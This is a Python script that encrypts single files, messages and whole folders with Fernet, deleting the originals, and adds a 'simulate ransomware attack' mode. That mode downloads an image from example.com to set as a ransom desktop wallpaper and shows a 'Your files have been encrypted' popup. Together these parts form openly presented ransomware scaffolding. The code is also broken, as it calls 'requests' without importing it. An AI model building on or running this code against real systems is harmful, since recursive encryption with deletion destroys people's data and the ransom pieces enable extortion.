#!/bin/python3

from cryptography.fernet import Fernet
import os
import ctypes
import tkinter as tk
from tkinter import messagebox

# Function to generate an encryption key
def generate_key():
    return Fernet.generate_key()

# Function to encrypt a file
def encrypt_file(filepath, key):
    with open(filepath, 'rb') as file:
        data = file.read()
    
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)
    
    encrypted_filepath = filepath + '.encrypted'
    with open(encrypted_filepath, 'wb') as file:
        file.write(encrypted_data)
    
    os.remove(filepath)
    print(f"File '{filepath}' encrypted to '{encrypted_filepath}'.")

# Function to decrypt a file
def decrypt_file(filepath, key):
    with open(filepath, 'rb') as file:
        encrypted_data = file.read()
    
    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(encrypted_data)
    
    decrypted_filepath = filepath[:-10]  # Remove the '.encrypted' extension
    with open(decrypted_filepath, 'wb') as file:
        file.write(decrypted_data)
    
    os.remove(filepath)
    print(f"File '{filepath}' decrypted to '{decrypted_filepath}'.")

# Function to encrypt a message
def encrypt_message(message, key):
    fernet = Fernet(key)
    encrypted_message = fernet.encrypt(message.encode())
    print("Encrypted message:", encrypted_message.decode())

# Function to decrypt a message
def decrypt_message(encrypted_message, key):
    fernet = Fernet(key)
    decrypted_message = fernet.decrypt(encrypted_message.encode())
    print("Decrypted message:", decrypted_message.decode())

# Function to recursively encrypt a folder and its contents
def encrypt_folder(folder_path, key):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

    print(f"Folder '{folder_path}' and its contents encrypted successfully.")

# Function to recursively decrypt a folder and its contents
def decrypt_folder(folder_path, key):
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path, key)

    print(f"Folder '{folder_path}' and its contents decrypted successfully.")

# Function to show a ransomware popup message
def show_ransomware_popup():
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    messagebox.showerror("Ransomware Alert", "Your files have been encrypted! To decrypt your files, follow the instructions in the README file.")
    root.destroy()

# Function to change the desktop wallpaper to a ransomware message
def set_ransomware_wallpaper():
    # Path to the ransomware wallpaper image
    wallpaper_path = os.path.join(os.getenv('TEMP'), "ransomware_wallpaper.jpg")
    
    # Write a simple ransomware message to the wallpaper file
    with open(wallpaper_path, 'wb') as f:
        f.write(requests.get('https://example.com/path/to/ransomware_image.jpg').content)
    
    # Set the desktop wallpaper
    ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 0)
    print("Desktop wallpaper set to ransomware message.")

# Main function for user interface
def main():
    print("Select mode:")
    print("1. Encrypt a file")
    print("2. Decrypt a file")
    print("3. Encrypt a message")
    print("4. Decrypt a message")
    print("5. Encrypt a folder and its contents")
    print("6. Decrypt a folder and its contents")
    print("7. Simulate ransomware attack")
    mode = input("Enter the mode number you want to use: ")

    if mode == '1':
        filepath = input("Enter the path to the file to encrypt: ")
        key = generate_key()
        encrypt_file(filepath, key)
        with open(filepath + '.key', 'wb') as key_file:
            key_file.write(key)
        print(f"File encrypted successfully. Key saved to '{filepath}.key'.")
    elif mode == '2':
        filepath = input("Enter the path to the file to decrypt: ")
        key_path = input("Enter the path to the key file: ")
        with open(key_path, 'rb') as key_file:
            key = key_file.read()
        decrypt_file(filepath, key)
        print("File decrypted successfully.")
    elif mode == '3':
        message = input("Enter the message to encrypt: ")
        key = generate_key()
        encrypt_message(message, key)
        with open('message.key', 'wb') as key_file:
            key_file.write(key)
    elif mode == '4':
        encrypted_message = input("Enter the encrypted message: ")
        key_path = input("Enter the path to the key file: ")
        with open(key_path, 'rb') as key_file:
            key = key_file.read()
        decrypt_message(encrypted_message, key)
    elif mode == '5':
        folder_path = input("Enter the path to the folder to encrypt: ")
        key = generate_key()
        encrypt_folder(folder_path, key)
        with open(os.path.join(folder_path, 'folder.key'), 'wb') as key_file:
            key_file.write(key)
        print(f"Folder '{folder_path}' and its contents encrypted successfully. Key saved to '{folder_path}/folder.key'.")
    elif mode == '6':
        folder_path = input("Enter the path to the folder to decrypt: ")
        key_path = input("Enter the path to the key file: ")
        with open(key_path, 'rb') as key_file:
            key = key_file.read()
        decrypt_folder(folder_path, key)
        print(f"Folder '{folder_path}' and its contents decrypted successfully.")
    elif mode == '7':
        set_ransomware_wallpaper()
        show_ransomware_popup()
        print("Ransomware simulation complete.")
    else:
        print("Invalid mode selected. Please select a mode between 1 to 7.")

if __name__ == "__main__":
    main()

